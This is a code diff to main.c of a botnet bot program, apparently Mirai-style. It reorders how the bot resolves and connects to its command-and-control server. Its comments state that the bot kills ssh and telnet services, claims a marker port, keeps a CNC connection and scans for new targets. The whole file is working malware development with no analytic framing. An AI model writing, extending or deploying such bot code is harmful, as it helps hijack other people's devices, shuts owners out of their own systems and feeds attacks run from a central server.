@@ -1,3 +1,10 @@
+/* main.c
+ * 1.running instance delection
+ * 2.keep connection with CNC server
+ * 3.close ssh, telnet service
+ * 4.oppcupise port 61142
+ * recenty modify at 2018-04-02 by Nrehearsal
+ */
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -12,22 +19,17 @@
 #include <string.h>
 
 
-#include "includes.h"
+#include "customize.h"
 #include "reslove.h"
-
-/*botnet bin running chicken
- *occupation 61142 port to mark running status
- *auto scan the network to find the next target can be attacked
- *keep the connection with the CNC server
- */
+#include "mt_random.h"
 
 static void ensure_single_instance(void);
 static void establish_connection(void);
 static void close_connection_CNC(void);
 static void close_connection_local(void);
 
-struct sockaddr_in srv_addr;
 static int fd_ctrl = -1, fd_serv = -1;
+struct sockaddr_in srv_addr;
 static BOOL need_setup_connection = FALSE;
 static BOOL bind_OK = FALSE;
 
@@ -36,34 +38,12 @@ int main(int argc, char **args)
 {
 	int pgroupid;
 	int select_count = 0;
-
-	srv_addr.sin_family = AF_INET;
-	reslove_dns_lookup(CNC_DOMAIN, &srv_addr.sin_addr.s_addr);
-	if (srv_addr.sin_addr.s_addr == 0)
-	{
-		printf("[main]Failed to reslove CNC_DOMAIN to address\n");	
-		return -1;
-	}
-	else
-	{
-		printf("[main]CNC address:%s\n", inet_ntoa(srv_addr.sin_addr));	
-	}
-	srv_addr.sin_port = htons(CNC_PORT);	
-
-	
+		
 	while(!bind_OK)
 	{
 		ensure_single_instance();
 		sleep(3);
 	}
-
-	/*
-	while(!need_setup_connection)
-	{
-		establish_connection();
-		sleep(3);	
-	}
-	*/
 
 #ifdef RELEASE
 	become a deamon
@@ -77,11 +57,22 @@ int main(int argc, char **args)
 	close(STDERR);
 #endif
 	
-	/*initialization module here
-	 *
-	 *
-	 *
-	 */
+	/*initialization module here*/
+	rand_init_by_array();
+
+	/*CNC server network information*/
+	srv_addr.sin_family = AF_INET;
+	reslove_dns_lookup(CNC_DOMAIN, &srv_addr.sin_addr.s_addr);
+	if (srv_addr.sin_addr.s_addr == 0)
+	{
+		printf("[main]Failed to reslove CNC_DOMAIN to address\n");	
+		return -1;
+	}
+	else
+	{
+		printf("[main]CNC address:%s\n", inet_ntoa(srv_addr.sin_addr));	
+	}
+	srv_addr.sin_port = htons(CNC_PORT);	
 
 	while(TRUE)
 	{
@@ -214,7 +205,6 @@ int main(int argc, char **args)
 	
 	return 0;
 }
-
 
 
 static void establish_connection()
